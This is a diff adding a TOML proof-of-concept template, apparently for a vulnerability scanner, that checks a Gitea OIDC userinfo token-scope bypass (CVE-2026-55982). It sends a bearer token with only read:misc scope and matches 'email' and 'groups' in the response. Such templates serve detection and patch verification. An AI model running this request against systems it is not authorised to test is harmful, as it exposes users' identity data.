@@ -1,0 +1,36 @@
+[info]
+author = "AVE"
+description = "验证 Gitea OIDC userinfo 端点是否未校验 API 令牌作用域。使用仅含 read:misc 作用域的令牌访问 /login/oauth/userinfo，若返回身份信息则说明存在作用域绕过漏洞。"
+id = "POC-AVE-2026-0638"
+name = "Gitea OIDC userinfo 端点 API 令牌作用域绕过 PoC"
+severity = "medium"
+tags = [
+    "cve-2026-55982",
+    "gitea",
+    "oidc",
+    "scope-bypass",
+]
+vuln_id = [
+    "CVE-2026-55982",
+    "AVE-2026-0638",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/login/oauth/userinfo"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer <read-misc-token>"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "email",
+    "groups",
+]
